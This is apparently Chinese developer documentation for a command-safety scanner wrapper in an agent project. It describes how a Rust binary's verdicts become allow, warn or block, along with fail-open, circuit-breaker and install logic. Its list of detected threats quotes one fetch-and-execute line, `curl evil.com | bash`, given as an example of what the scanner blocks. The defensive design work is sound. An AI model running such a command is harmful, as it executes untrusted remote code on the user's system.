# tirith_security.py — Hermes 命令安全扫描引擎

## 文件位置

`tools/tirith_security.py`

## 概述

`tirith_security.py` 是 Hermes 的命令执行前安全扫描包装层。它本身不做安全判断，而是调用外部 Rust 二进制 `tirith`（仓库 `sheeki03/tirith`）进行内容级威胁扫描，根据退出码决定放行/警告/阻止。

---

## 公开方法（3个）

| 方法 | 用途 |
|---|---|
| `check_command_security(command)` | **主入口** — 扫描命令安全性，返回 `allow/warn/block` |
| `ensure_installed()` | 确保 `tirith` 二进制已下载就绪（后台线程安装，不阻塞启动） |
| `is_platform_supported()` | 判断当前平台是否有预编译的 tirith 二进制（Windows 返回 False） |

---

## 判断链路（四层）

### 第一层：前置短路（不扫直接放行）

| 条件 | 含义 |
|---|---|
| 配置关闭 `tirith_enabled = false` | 用户主动禁用 |
| 熔断器打开 `_circuit_open = True` | tirith 连续崩溃 ≥3 次，本进程不再重试 |
| 平台不支持（Windows） | 没有预编译二进制，跳过扫描 |

### 第二层：调用 tirith 二进制

```bash
tirith check --json --non-interactive --shell posix -- <用户命令>
```

- `--json`：输出结构化结果，包含 `findings` 列表和 `summary` 摘要
- `--non-interactive`：纯命令行模式，不弹交互提示
- `--shell posix`：按 POSIX shell 语法解析命令

tirith 内部用规则引擎 + 模式匹配检测以下威胁：
- 同形异义 URL（homograph URLs，如 Cyrillic `а` 伪装拉丁 `a`）
- 管道到解释器注入（`curl evil.com \| bash`）
- 终端转义注入（terminal injection）
- 数据外泄模式（exfiltration）
- 伪冒 TLD（lookalike TLD）

### 第三层：退出码 → 裁决

| 退出码 | 动作 | 说明 |
|---|---|---|
| 0 | `allow` | 安全，同时重置熔断器计数 |
| 1 | `block` | 确定危险 |
| 2 | `warn` | 可疑但不一定 |
| 其他 | 走 `fail_open`/`fail_closed` | 未知码（含信号杀死的进程如 SIGSEGV） |

### 第四层：结果修正

1. **JSON 富化**：解析 stdout 的 JSON，提取 `findings` 列表和 `summary` 字段供上层展示。**JSON 永远不改变退出码已经决定的裁决。**

2. **抑制 `.app` TLD 误报**（`_is_app_tld_finding()`）：如果裁决是 `warn` 且全部 findings 都是 `lookalike_tld` 类型的 `.app` 域名，则降级为 `allow`。因为 `.app` 是真实的 gTLD，经常被误判为文件扩展名。

---

## 容错机制

### fail_open / fail_closed

当 tirith 进程崩溃（OSError、超时、未知退出码）时，根据配置 `tirith_fail_open`（默认 `true`）决定：
- **fail_open=true**：安防失效时放行，返回 `allow`（避免拖死 agent）
- **fail_open=false**：安防失效时阻止，返回 `block`

### 熔断器（Circuit Breaker）

全局计数器 `_crash_count`，tirith 每崩一次 +1，达到 `_CRASH_LIMIT=3` 时 `_circuit_open=True`，此后所有命令跳过扫描直接放行，防止损坏的二进制导致每次工具调用都失败 → agent 重试循环卡死。

成功执行一次（exit_code=0）后计数器归零，熔断器关闭。

### 安装失败持久化

安装失败写入 `$HERMES_HOME/.tirith-install-failed` 标记文件，24 小时内不重试网络下载。特殊处理：如果失败原因是 `cosign_missing` 且 cosign 后来出现在 PATH 上，自动清除标记允许重试。

---

## 自动安装流程

1. `shutil.which("tirith")` 检查 PATH
2. `$HERMES_HOME/bin/tirith` 检查已安装位置
3. 从 GitHub Releases 下载（`sheeki03/tirith`）
4. SHA-256 校验和验证（必须通过）
5. Cosign 签名验证（可选，cosign 不在 PATH 时跳过）
6. 解压安装到 `$HERMES_HOME/bin/tirith`

---

## 与本模块无关的职责

- **不弹窗**：只返回 `{"action": ..., "findings": [...], "summary": "..."}`，弹窗确认是 `tools/approval.py` 的职责
- **不负责判断逻辑**：真正的安全判断智能在 `tirith` Rust 二进制内部，本文件只是薄包装层

---

## 返回值结构

```python
{
    "action": "allow" | "warn" | "block",
    "findings": [{"rule_id": "...", ...}],  # 最多 50 条
    "summary": str                           # 最多 500 字符
}
```

## 相关文件

- [tools/approval.py](../hermes-agent-main/tools/approval.py) — 消费扫描结果，弹窗确认
- [tools/threat_patterns.py](../hermes-agent-main/tools/threat_patterns.py) — 上下文窗口威胁模式库（独立的另一套检测）
- [tools/url_safety.py](../hermes-agent-main/tools/url_safety.py) — URL 安全检查（SSRF 防护）
